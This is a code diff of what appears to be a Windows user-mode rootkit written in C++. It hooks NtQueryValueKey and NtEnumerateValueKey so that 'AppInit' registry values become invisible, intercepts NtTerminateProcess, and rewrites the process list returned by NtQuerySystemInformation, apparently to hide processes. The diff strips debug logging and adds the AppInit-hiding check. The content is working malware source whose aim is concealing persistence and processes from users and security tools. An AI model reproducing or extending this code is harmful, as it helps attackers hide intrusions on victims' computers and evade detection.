@@ -57,7 +57,6 @@ bool ExplorerChild()
         ppid = getParentPID(pid);
         e = getProcessName(ppid, fname, MAX_PATH);
         name = std::string(fname);
-        printf("PPID=%d Err=%d EXE={%s}\n", ppid, e, fname);
         pid = ppid;
     } while (name.find("explorer") == std::string::npos);
 
@@ -106,39 +105,28 @@ PWCHAR KeyValueInformationGetName(LPVOID keyValueInformation, NT_KEY_VALUE_INFOR
 //     return status;
 // }
 
-NTSTATUS WINAPI HookedNtQueryValueKey(
-    HANDLE KeyHandle,
-    PUNICODE_STRING ValueName,
-    NT_KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
-    PVOID KeyValueInformation,
-    ULONG Length,
-    PULONG ResultLength)
+NTSTATUS WINAPI HookedNtQueryValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName, NT_KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength)
 {
-    // std::wstring w_value = std::wstring(ValueName->Buffer);
-    // if (w_value.find(L"Appinit") != std::wstring::npos)
-    //     return STATUS_OBJECT_NAME_NOT_FOUND;
-
+    if (ValueName->Length > 3)
+    {
+        std::wstring w_name = std::wstring(ValueName->Buffer);
+        if (w_name.find(L"Appinit") != std::wstring::npos || w_name.find(L"AppInit") != std::wstring::npos)
+            return STATUS_OBJECT_NAME_NOT_FOUND;
+    }
     return OriginalNtQueryValueKey(KeyHandle, ValueName, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);
-
-    // return status;
 }
 
 NTSTATUS WINAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_VALUE_INFORMATION_CLASS keyValueInformationClass, LPVOID keyValueInformation, ULONG keyValueInformationLength, PULONG resultLength)
 {
     NTSTATUS status = OriginalNtEnumerateValueKey(key, index, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);
 
-    // Implement hiding of registry values by correcting the index in NtEnumerateValueKey.
     if (status == ERROR_SUCCESS && (keyValueInformationClass == KeyValueBasicInformation || keyValueInformationClass == KeyValueFullInformation))
     {
         for (ULONG i = 0, newIndex = 0; newIndex <= index && status == ERROR_SUCCESS; i++)
         {
             status = OriginalNtEnumerateValueKey(key, i, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);
-            OutputDebugStringA(std::to_string(index).c_str());
-            OutputDebugStringA(std::to_string(newIndex).c_str());
-            OutputDebugStringA(std::to_string(i).c_str());
 
             std::wstring name = std::wstring(KeyValueInformationGetName(keyValueInformation, keyValueInformationClass));
-            OutputDebugStringW(name.c_str());
             if (name.find(L"AppInit") == std::wstring::npos)
             {
                 newIndex++;
@@ -149,9 +137,7 @@ NTSTATUS WINAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_VALUE_
     return status;
 }
 
-NTSTATUS WINAPI HookedNtTerminateProcess(
-    HANDLE hProcess,
-    UINT code)
+NTSTATUS WINAPI HookedNtTerminateProcess(HANDLE hProcess, UINT code)
 {
     OutputDebugStringA("in ntterminate");
     if (GetProcessId(GetCurrentProcess()) == GetProcessId(hProcess))
@@ -178,7 +164,6 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(
     ULONG SystemInformationLength,
     PULONG ReturnLength)
 {
-    OutputDebugStringA("in query system");
     NTSTATUS status = OriginalNtQuerySystemInformation(
         SystemInformationClass,
         SystemInformation,
@@ -196,7 +181,6 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(
             prev = curr;
             curr = PMY_SYSTEM_PROCESS_INFORMATION((PUCHAR)curr + curr->NextEntryOffset);
         }
-        OutputDebugStringA("wrote thru list");
     }
 
     return status;
